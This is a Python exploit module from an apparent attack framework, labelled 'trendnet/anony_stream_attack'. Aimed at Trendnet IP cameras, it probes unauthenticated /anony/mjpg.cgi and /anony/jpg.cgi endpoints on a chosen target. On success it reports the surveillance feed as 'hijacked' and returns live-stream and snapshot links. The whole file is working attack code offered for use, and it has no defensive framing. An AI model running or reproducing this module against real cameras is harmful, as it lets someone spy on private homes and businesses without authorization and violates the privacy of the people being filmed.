import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "trendnet/anony_stream_attack"
        self.description = "Exploit module to generate public live video links and extract a still frame from Trendnet cameras."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            base_url = f"http://{target}:{port}"
        else:
            base_url = target.rstrip('/')
            
        mjpg_url = f"{base_url}/anony/mjpg.cgi"
        jpg_url = f"{base_url}/anony/jpg.cgi"
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                # Étape de validation de l'injection/accès
                print("\033[1;33m[*] Test de l'accès au flux vidéo MJPEG anonyme...\033[0m")
                response = await client.head(mjpg_url)
                
                if response.status_code == 200:
                    return {
                        "success": True,
                        "details": (
                            f"Trendnet surveillance feed hijacked successfully!\n"
                            f"  -> Live MJPEG Stream Link: {mjpg_url}\n"
                            f"  -> Still Snapshot Link: {jpg_url}"
                        )
                    }
                else:
                    return {"success": False, "details": f"Target endpoint returned code {response.status_code}. Might be patched."}
        except Exception as e:
            return {"success": False, "error": str(e)}
